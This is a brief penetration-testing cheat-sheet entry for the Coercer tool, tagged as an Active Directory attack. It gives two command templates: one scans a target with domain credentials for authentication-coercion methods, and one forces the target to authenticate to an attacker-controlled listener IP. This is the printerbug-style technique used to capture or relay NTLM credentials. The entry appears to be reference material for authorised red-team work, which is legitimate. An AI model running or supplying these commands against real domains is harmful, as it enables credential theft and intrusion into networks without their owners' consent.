
# Coercer

% printerbug, Active directory,https://github.com/p0dalirius/Coercer
#plateform/linux  #target/remote #cat/ATTACK/COERCE 

## scan
```
sudo coercer scan -u <user> -p '<password>' -d <domain_fqdn> -t <target-ip> 
```

## coerce
```
sudo coercer coerce -u <user> -p '<password>' -d <domain_fqdn> -l <listen_ip> -t <target-ip> -v --always-continue 
```